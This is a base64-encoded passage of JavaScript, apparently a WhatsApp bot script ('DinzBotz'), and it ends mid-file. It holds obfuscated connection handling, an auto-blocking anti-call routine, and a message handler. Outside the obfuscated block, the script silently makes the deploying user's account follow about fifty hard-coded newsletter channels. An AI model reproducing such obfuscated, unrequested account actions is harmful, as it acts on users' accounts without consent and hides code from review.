ThlZTUgPSB7CiAgICAgICAgICAgICd1QnZwYyc6IGZ1bmN0aW9uIChfMHgzNjM2MTksIF8weDJkZWUxMykgewogICAgICAgICAgICAgICAgcmV0dXJuIF8weDM2MzYxOSA9PT0gXzB4MmRlZTEzOwogICAgICAgICAgICB9LAogICAgICAgICAgICAnaFFYTEUnOiBfMHgzN2Q0MTAoMHgxNTUpLAogICAgICAgICAgICAnT0Rxa0InOiBmdW5jdGlvbiAoXzB4MjVmODE5LCBfMHgyNWI0YjIpIHsKICAgICAgICAgICAgICAgIHJldHVybiBfMHgyNWY4MTkgPT09IF8weDI1YjRiMjsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ1dRdm1kJzogZnVuY3Rpb24gKF8weDQ5ODBkMikgewogICAgICAgICAgICAgICAgcmV0dXJuIF8weDQ5ODBkMigpOwogICAgICAgICAgICB9LAogICAgICAgICAgICAnQnhnbHknOiBmdW5jdGlvbiAoXzB4MzEyZWFhLCBfMHhiYTI5NmQpIHsKICAgICAgICAgICAgICAgIHJldHVybiBfMHgzMTJlYWEgPT09IF8weGJhMjk2ZDsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ3VqUEVzJzogXzB4MzdkNDEwKDB4MTI2KSArIF8weDM3ZDQxMCgweDE1YSkgKyBfMHgzN2Q0MTAoMHgxOGYpICsgXzB4MzdkNDEwKDB4MTRhKSwKICAgICAgICAgICAgJ0JkZkVyJzogXzB4MzdkNDEwKDB4MTI2KSArIF8weDM3ZDQxMCgweDE0ZikgKyBfMHgzN2Q0MTAoMHgxOTApICsgXzB4MzdkNDEwKDB4MThmKSArIF8weDM3ZDQxMCgweDE0NCksCiAgICAgICAgICAgICd5Snp5aSc6IGZ1bmN0aW9uIChfMHgzNjFkMzkpIHsKICAgICAgICAgICAgICAgIHJldHVybiBfMHgzNjFkMzkoKTsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ0lhdHJYJzogZnVuY3Rpb24gKF8weDExZjkxMywgXzB4MjAzN2M3KSB7CiAgICAgICAgICAgICAgICByZXR1cm4gXzB4MTFmOTEzID09PSBfMHgyMDM3Yzc7CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICdPSkJSeCc6IF8weDM3ZDQxMCgweDEyNikgKyBfMHgzN2Q0MTAoMHgxMjMpICsgXzB4MzdkNDEwKDB4MTI3KSArIF8weDM3ZDQxMCgweDE4OCkgKyBfMHgzN2Q0MTAoMHgxNWMpICsgXzB4MzdkNDEwKDB4MTdjKSArIF8weDM3ZDQxMCgweDE0ZSkgKyBfMHgzN2Q0MTAoMHgxMzEpICsgXzB4MzdkNDEwKDB4MTMyKSwKICAgICAgICAgICAgJ2d5ZWNuJzogZnVuY3Rpb24gKF8weDRlM2VkOCkgewogICAgICAgICAgICAgICAgcmV0dXJuIF8weDRlM2VkOCgpOwogICAgICAgICAgICB9LAogICAgICAgICAgICAnT055UGInOiBmdW5jdGlvbiAoXzB4NWM3ODc0LCBfMHhmNDg3MmQpIHsKICAgICAgICAgICAgICAgIHJldHVybiBfMHg1Yzc4NzQgPT09IF8weGY0ODcyZDsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ0V6ZlBaJzogXzB4MzdkNDEwKDB4MTFkKSArIF8weDM3ZDQxMCgweDEyZCkgKyBfMHgzN2Q0MTAoMHgxN2EpICsgJy4nLAogICAgICAgICAgICAnZld6TWEnOiBmdW5jdGlvbiAoXzB4OTgwMWIxKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gXzB4OTgwMWIxKCk7CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICdscGp4Wic6IF8weDM3ZDQxMCgweDEyNikgKyBfMHgzN2Q0MTAoMHgxOTEpICsgXzB4MzdkNDEwKDB4MTdmKSArIF8weDM3ZDQxMCgweDE1ZSksCiAgICAgICAgICAgICdvSnhmQSc6IGZ1bmN0aW9uIChfMHg1ZGI1OTgsIF8weDNmNDljZSkgewogICAgICAgICAgICAgICAgcmV0dXJuIF8weDVkYjU5OCA9PSBfMHgzZjQ5Y2U7CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICdJdkVRTCc6IF8weDM3ZDQxMCgweDE5OSksCiAgICAgICAgICAgICdIQ1lYRSc6IF8weDM3ZDQxMCgweDE5NCksCiAgICAgICAgICAgICd5Wkhkdyc6IGZ1bmN0aW9uIChfMHg0NDE0MzUsIF8weDExZWE4MSwgXzB4MzRhZmIxKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gXzB4NDQxNDM1KF8weDExZWE4MSwgXzB4MzRhZmIxKTsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ2huYllHJzogXzB4MzdkNDEwKDB4MTkzKSwKICAgICAgICAgICAgJ0FCcGZJJzogXzB4MzdkNDEwKDB4MTM0KSwKICAgICAgICAgICAgJ3VhUExzJzogZnVuY3Rpb24gKF8weDI4YzVmZCwgXzB4M2EyOGEzKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gXzB4MjhjNWZkID09IF8weDNhMjhhMzsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ3Zra2ZsJzogXzB4MzdkNDEwKDB4MTdkKSwKICAgICAgICAgICAgJ2VZdmxUJzogXzB4MzdkNDEwKDB4MTcxKSArIF8weDM3ZDQxMCgweDEzZSkgKyBfMHgzN2Q0MTAoMHgxNjQpLAogICAgICAgICAgICAncm9VU0QnOiBfMHgzN2Q0MTAoMHgxNjcpICsgXzB4MzdkNDEwKDB4MTExKSArIF8weDM3ZDQxMCgweDE2NCksCiAgICAgICAgICAgICdpWmJ1aSc6IF8weDM3ZDQxMCgweDE0YykgKyBfMHgzN2Q0MTAoMHgxMzkpICsgXzB4MzdkNDEwKDB4MTY0KSwKICAgICAgICAgICAgJ1V0c3d2JzogXzB4MzdkNDEwKDB4MTgzKSArIF8weDM3ZDQxMCgweDE3NSkgKyBfMHgzN2Q0MTAoMHgxNjQpLAogICAgICAgICAgICAnYm9nY1gnOiBfMHgzN2Q0MTAoMHgxNDkpICsgXzB4MzdkNDEwKDB4MTFmKSArIF8weDM3ZDQxMCgweDE2NCksCiAgICAgICAgICAgICdnT3pkdSc6IF8weDM3ZDQxMCgweDE3NikgKyBfMHgzN2Q0MTAoMHgxMGQpICsgXzB4MzdkNDEwKDB4MTY0KSwKICAgICAgICAgICAgJ2NEZkhhJzogXzB4MzdkNDEwKDB4MTc0KSArIF8weDM3ZDQxMCgweDE2YikgKyBfMHgzN2Q0MTAoMHgxNjQpLAogICAgICAgICAgICAnbkJoS0UnOiBfMHgzN2Q0MTAoMHgxMmMpICsgXzB4MzdkNDEwKDB4MTBmKSArIF8weDM3ZDQxMCgweDE2NCksCiAgICAgICAgICAgICdWTVRyUCc6IF8weDM3ZDQxMCgweDE5OCkgKyBfMHgzN2Q0MTAoMHgxNTYpICsgXzB4MzdkNDEwKDB4MTY0KSwKICAgICAgICAgICAgJ3B0cVlSJzogXzB4MzdkNDEwKDB4MTRjKSArIF8weDM3ZDQxMCgweDE2YykgKyBfMHgzN2Q0MTAoMHgxNjQpLAogICAgICAgICAgICAnbU1SanUnOiBmdW5jdGlvbiAoXzB4NTg3ODIwLCBfMHhhZWY1YykgewogICAgICAgICAgICAgICAgcmV0dXJuIF8weDU4NzgyMChfMHhhZWY1Yyk7CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICdSbXZGVic6IF8weDM3ZDQxMCgweDExOCksCiAgICAgICAgICAgICdXVHNpTic6IF8weDM3ZDQxMCgweDExNyksCiAgICAgICAgICAgICduaWNWQSc6IF8weDM3ZDQxMCgweDE0MCksCiAgICAgICAgICAgICdORFdtQic6IF8weDM3ZDQxMCgweDE2OSksCiAgICAgICAgICAgICdJWUlmVyc6IF8weDM3ZDQxMCgweDEyOCkgKyAndCcsCiAgICAgICAgICAgICdqa0NpUyc6IF8weDM3ZDQxMCgweDEyZSkgKyAndCcsCiAgICAgICAgICAgICdHalJZRic6IGZ1bmN0aW9uIChfMHgyMDM4NmYsIF8weDQzMTI3YikgewogICAgICAgICAgICAgICAgcmV0dXJuIF8weDIwMzg2ZiArIF8weDQzMTI3YjsKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ1RJVkd2JzogXzB4MzdkNDEwKDB4MTQxKSArIF8weDM3ZDQxMCgweDE3MykgKyBfMHgzN2Q0MTAoMHgxODEpCiAgICAgICAgfSwgewogICAgICAgICAgICBjb25uZWN0aW9uOiBfMHgxODZkNmEsCiAgICAgICAgICAgIGxhc3REaXNjb25uZWN0OiBfMHgxNzY5NmYKICAgICAgICB9ID0gXzB4M2IzMTU3OwogICAgdHJ5IHsKICAgICAgICBpZiAoXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE4MCldKF8weDE4NmQ2YSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE3MildKSkgewogICAgICAgICAgICBsZXQgXzB4MjVkOTJhID0gbmV3IEJvb20oXzB4MTc2OTZmPy5bXzB4MzdkNDEwKDB4MTI1KV0pPy5bXzB4MzdkNDEwKDB4MTM2KV1bXzB4MzdkNDEwKDB4MTNiKV07CiAgICAgICAgICAgIGlmIChfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTk1KV0oXzB4MjVkOTJhLCBEaXNjb25uZWN0UmVhc29uW18weDM3ZDQxMCgweDExMildKSkKICAgICAgICAgICAgICAgIGNvbnNvbGVbXzB4MzdkNDEwKDB4MThjKV0oXzB4MzdkNDEwKDB4MTNhKSArIF8weDM3ZDQxMCgweDE0OCkgKyBfMHgzN2Q0MTAoMHgxNmEpICsgXzB4MzdkNDEwKDB4MTFiKSArIF8weDM3ZDQxMCgweDEyNCkgKyBfMHgzN2Q0MTAoMHgxMzMpKSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEyMildKERpbnpCb3R6SW5kKTsKICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE2NildKF8weDI1ZDkyYSwgRGlzY29ubmVjdFJlYXNvbltfMHgzN2Q0MTAoMHgxMzcpICsgXzB4MzdkNDEwKDB4MTYzKV0pKQogICAgICAgICAgICAgICAgICAgIGNvbnNvbGVbXzB4MzdkNDEwKDB4MThjKV0oXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE0YildKSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEyMildKERpbnpCb3R6SW5kKTsKICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmIChfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTY2KV0oXzB4MjVkOTJhLCBEaXNjb25uZWN0UmVhc29uW18weDM3ZDQxMCgweDEzNykgKyBfMHgzN2Q0MTAoMHgxMTMpXSkpCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGVbXzB4MzdkNDEwKDB4MThjKV0oXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE3MCldKSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDExMCldKERpbnpCb3R6SW5kKTsKICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxMjApXShfMHgyNWQ5MmEsIERpc2Nvbm5lY3RSZWFzb25bXzB4MzdkNDEwKDB4MTM3KSArIF8weDM3ZDQxMCgweDE4NildKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGVbXzB4MzdkNDEwKDB4MThjKV0oXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEzYyldKSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEyMildKERpbnpCb3R6SW5kKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEyMCldKF8weDI1ZDkyYSwgRGlzY29ubmVjdFJlYXNvbltfMHgzN2Q0MTAoMHgxOTIpXSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZVtfMHgzN2Q0MTAoMHgxOGMpXShfMHgzN2Q0MTAoMHgxOWEpICsgXzB4MzdkNDEwKDB4MTYxKSArIF8weDM3ZDQxMCgweDEwYSkgKyBfMHgzN2Q0MTAoMHgxMGUpICsgXzB4MzdkNDEwKDB4MTE5KSksIF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNjUpXShEaW56Qm90ekluZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoXzB4MTk4ZWU1W18weDM3ZDQxMCgweDExYSldKF8weDI1ZDkyYSwgRGlzY29ubmVjdFJlYXNvbltfMHgzN2Q0MTAoMHgxNTgpICsgXzB4MzdkNDEwKDB4MTIxKV0pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlW18weDM3ZDQxMCgweDE4YyldKF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNTkpXSksIF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNGQpXShEaW56Qm90ekluZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTFhKV0oXzB4MjVkOTJhLCBEaXNjb25uZWN0UmVhc29uW18weDM3ZDQxMCgweDEyYildKSA/IChjb25zb2xlW18weDM3ZDQxMCgweDE4YyldKF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxODUpXSksIF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxMTApXShEaW56Qm90ekluZCkpIDogKGNvbnNvbGVbXzB4MzdkNDEwKDB4MThjKV0oXzB4MzdkNDEwKDB4MTYwKSArIF8weDM3ZDQxMCgweDE4ZCkgKyBfMHgzN2Q0MTAoMHgxMWUpICsgXzB4MjVkOTJhICsgJ3wnICsgXzB4MTg2ZDZhKSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDExMCldKERpbnpCb3R6SW5kKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgKF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxOGIpXShfMHgzYjMxNTdbXzB4MzdkNDEwKDB4MTM3KV0sIF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxM2QpXSkgfHwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE4YildKF8weDNiMzE1N1tfMHgzN2Q0MTAoMHgxMTYpICsgXzB4MzdkNDEwKDB4MTU0KSArIF8weDM3ZDQxMCgweDEwYildLCBfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTMwKV0pKSAmJiBjb25zb2xlW18weDM3ZDQxMCgweDE4YyldKF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxODkpXShjb2xvciwgXzB4MzdkNDEwKDB4MTdlKSArIF8weDM3ZDQxMCgweDE4YSksIF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxODcpXSkpOwogICAgICAgIGlmIChfMHgxOThlZTVbXzB4MzdkNDEwKDB4MThiKV0oXzB4M2IzMTU3W18weDM3ZDQxMCgweDEzNyldLCBfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTc3KV0pIHx8IF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNTcpXShfMHgzYjMxNTdbXzB4MzdkNDEwKDB4MTE2KSArIF8weDM3ZDQxMCgweDE1NCkgKyBfMHgzN2Q0MTAoMHgxMGIpXSwgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE3OSldKSkgewogICAgICAgICAgICBsZXQgXzB4MzI3MmNiID0gWwogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE1YildLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE4ZSldLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEyZildLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE1ZildLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE3OCldLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE1MildLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDExNSldLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE0NSldLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDEzOCldLAogICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE4NCldCiAgICAgICAgICAgIF07CiAgICAgICAgICAgIGZvciAobGV0IF8weDdhNzNiMCBvZiBfMHgzMjcyY2IpIHsKICAgICAgICAgICAgICAgIGF3YWl0IERpbnpCb3R6W18weDM3ZDQxMCgweDE1MCkgKyBfMHgzN2Q0MTAoMHgxMTQpXShfMHg3YTczYjApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGF3YWl0IF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNmUpXShkZWxheSwgMHgzZDYgKiAweDcgKyAtMHgzICogMHgxMGYgKyAtMHhmZGUpLCBjZm9udHNbXzB4MzdkNDEwKDB4MTk2KV0oXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE2ZildLCB7CiAgICAgICAgICAgICAgICAnZm9udCc6IF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNWQpXSwKICAgICAgICAgICAgICAgICdhbGlnbic6IF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxMGMpXSwKICAgICAgICAgICAgICAgICdjb2xvcnMnOiBbCiAgICAgICAgICAgICAgICAgICAgXzB4MTk4ZWU1W18weDM3ZDQxMCgweDExYyldLAogICAgICAgICAgICAgICAgICAgIF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNTMpXQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICdiYWNrZ3JvdW5kJzogXzB4MTk4ZWU1W18weDM3ZDQxMCgweDE0MyldLAogICAgICAgICAgICAgICAgJ21heExlbmd0aCc6IDB4MTQsCiAgICAgICAgICAgICAgICAncmF3TW9kZSc6ICFbXQogICAgICAgICAgICB9KTsKICAgICAgICB9CiAgICB9IGNhdGNoIChfMHhmYzE5YjApIHsKICAgICAgICBjb25zb2xlW18weDM3ZDQxMCgweDE4YyldKF8weDE5OGVlNVtfMHgzN2Q0MTAoMHgxNmQpXShfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTUxKV0sIF8weGZjMTliMCkpLCBfMHgxOThlZTVbXzB4MzdkNDEwKDB4MTRkKV0oRGluekJvdHpJbmQpOwogICAgfQp9KSk7Cgphd2FpdCBkZWxheSg1NTU1KSAKc3RhcnQoJzInLGNvbG9ycy5ib2xkLndoaXRlKCdcblxuTWVudW5nZ3UgUGVzYW4gQmFydS4uJykpCgpEaW56Qm90ei5ldi5vbignY3JlZHMudXBkYXRlJywgYXdhaXQgc2F2ZUNyZWRzKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjMzOTU4NTAzMDUwNjhAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxNzk5NDcxNTE3MkBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDE4OTQ4MjE1NjQ1QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MDE5NTk5NDQ1NjVAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxNjMyNzY2Mzk1NUBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAyODMwNjM3NTM3QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MjEyMDA3NDQ3ODBAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQwMDIzNjk4OTAxMEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDE5NzY5OTY5MzM0QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MDIxNTA1OTcyOTJAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxODY2MDkyMTM0MEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDIxNzIyNDY5OTY5QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MTgxNTcyMzk1NzJAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzM5ODgxNjYxMzYwNkBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAxNTMzMjYxODMxQG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MTc5ODUyMjkxMDdAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQwMDgzODM3NTc0NkBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDIxNjQ3OTYzMTAzQG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MjAzODcyMDE2NjZAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQyMTE1NDgwMzg5NEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAzMzk5MjAyMjY3QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MTg1OTkwMTY5MTdAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxOTkxNTAwNTIzMkBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDE5NDk2Njg2MTQxQG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MDA0NDc0OTc5OTFAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxNzU3Nzg2MDQwN0BuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDE5NzgyMjE1MDQ4QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MDA2Mjk3NzY4NDlAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzM5OTQ5NjM2NTY3OEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAyMDM3NjQyMzI4QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MjAzNjE2NTI0NDZAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzM3NTY1NTA3MjU0M0BuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAyMjc1MDU3ODMzQG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MjA3NDg0MjE0OTVAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQwMTkwMTEwMTg4NEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzMzk5Nzg3MTgwNjUxQG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MjE0MDc2NDM0NzFAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQwMzAwODIyMTUyOEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAyNjkwODY2MzgzQG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MTY3Nzg4OTc4NTJAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQyMTAzNTQxMDI0MkBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDE5MDAxOTczNzg5QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MTk4NzIwMjgwNDZAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxODgwMDkxNTk3N0BuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAyNTk5MDE0OTY5QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjMzOTM5MDE2ODI3NjFAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQwODY3OTQyNzcyNEBuZXdzbGV0dGVyJykKRGluekJvdHoubmV3c2xldHRlckZvbGxvdygnMTIwMzYzNDAzMzQ3OTA2MDk2QG5ld3NsZXR0ZXInKQpEaW56Qm90ei5uZXdzbGV0dGVyRm9sbG93KCcxMjAzNjM0MjAxMjU2Mjg4NzhAbmV3c2xldHRlcicpCkRpbnpCb3R6Lm5ld3NsZXR0ZXJGb2xsb3coJzEyMDM2MzQxNTk1MTE1OTQwOEBuZXdzbGV0dGVyJykKCiAgICAvLyBBbnRpIENhbGwKICAgIERpbnpCb3R6LmV2Lm9uKCdjYWxsJywgYXN5bmMgKFhlb25QYXBhKSA9PiB7CiAgICBsZXQgYm90TnVtYmVyID0gYXdhaXQgRGluekJvdHouZGVjb2RlSmlkKERpbnpCb3R6LnVzZXIuaWQpCiAgICBsZXQgWGVvbkJvdE51bSA9IGRiLnNldHRpbmdzW2JvdE51bWJlcl0uYW50aWNhbGwKICAgIGlmICghWGVvbkJvdE51bSkgcmV0dXJuCiAgICBjb25zb2xlLmxvZyhYZW9uUGFwYSkKICAgIGZvciAobGV0IFhlb25GdWNrcyBvZiBYZW9uUGFwYSkgewogICAgaWYgKFhlb25GdWNrcy5pc0dyb3VwID09IGZhbHNlKSB7CiAgICBpZiAoWGVvbkZ1Y2tzLnN0YXR1cyA9PSAib2ZmZXIiKSB7CiAgICBsZXQgWGVvbkJsb2tNc2cgPSBhd2FpdCBEaW56Qm90ei5zZW5kVGV4dFdpdGhNZW50aW9ucyhYZW9uRnVja3MuZnJvbSwgYCoke0RpbnpCb3R6LnVzZXIubmFtZX0qIGNhbid0IHJlY2VpdmUgJHtYZW9uRnVja3MuaXNWaWRlbyA/IGB2aWRlb2AgOiBgdm9pY2VgIH0gY2FsbC4gU29ycnkgQCR7WGVvbkZ1Y2tzLmZyb20uc3BsaXQoJ0AnKVswXX0geW91IHdpbGwgYmUgYmxvY2tlZC4gSWYgYWNjaWRlbnRhbGx5IHBsZWFzZSBjb250YWN0IHRoZSBvd25lciB0byBiZSB1bmJsb2NrZWQgIWApCiAgICBEaW56Qm90ei5zZW5kQ29udGFjdChYZW9uRnVja3MuZnJvbSwgZ2xvYmFsLm93bmVyLCBYZW9uQmxva01zZykKICAgIGF3YWl0IHNsZWVwKDgwMDApCiAgICBhd2FpdCBEaW56Qm90ei51cGRhdGVCbG9ja1N0YXR1cyhYZW9uRnVja3MuZnJvbSwgImJsb2NrIikKICAgIH0KICAgIH0KICAgIH0KICAgIH0pCkRpbnpCb3R6LmV2Lm9uKCJtZXNzYWdlcy51cHNlcnQiLCBhc3luYyAoY2hhdFVwZGF0ZSkgPT4gewogIHRyeSB7CmNvbnN0IGtheSA9IGNoYXRVcGRhdGUubWVzc2FnZXNbMF0KaWYgKCFrYXkubWVzc2FnZSkgcmV0dXJuCmtheS5tZXNzYWdlID0gKE9iamVjdC5rZXlzKGtheS5tZXNzYWdlKVswXSA9PT0gJ2VwaGVtZXJhbE1lc3NhZ2UnKSA/IGtheS5tZXNzYWdlLmVwaGVtZXJhbE1lc3NhZ2UubWVzc2FnZSA6IGtheS5tZXNzYWdlCmlmIChrYXkua2V5ICYmIGtheS5rZXkucmVtb3RlSmlkID09PSAnc3RhdHVzQGJyb2FkY2FzdCcpICB7CmF3YWl0IERpbnpCb3R6L